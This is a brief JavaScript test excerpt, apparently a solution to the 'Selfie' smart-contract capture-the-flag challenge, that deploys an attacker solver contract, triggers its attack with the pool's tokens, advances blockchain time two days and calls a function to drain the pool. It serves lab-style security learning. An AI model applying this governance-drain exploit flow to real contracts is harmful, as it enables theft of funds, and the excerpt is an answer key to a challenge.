...
describe("[Challenge] Selfie", function () {
    ...
    it("Exploit", async function () {
        ...
        const SelfieSolverFactory = await ethers.getContractFactory("SelfieSolver", attacker)
        const solver = await SelfieSolverFactory.deploy(this.pool.address, this.governance.address)
        await solver.attack(TOKENS_IN_POOL)
        // Wait 2 days (ACTION_DELAY_IN_SECONDS) so that we can execute the queued action
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60])
        await solver.executeToDrain()
    })
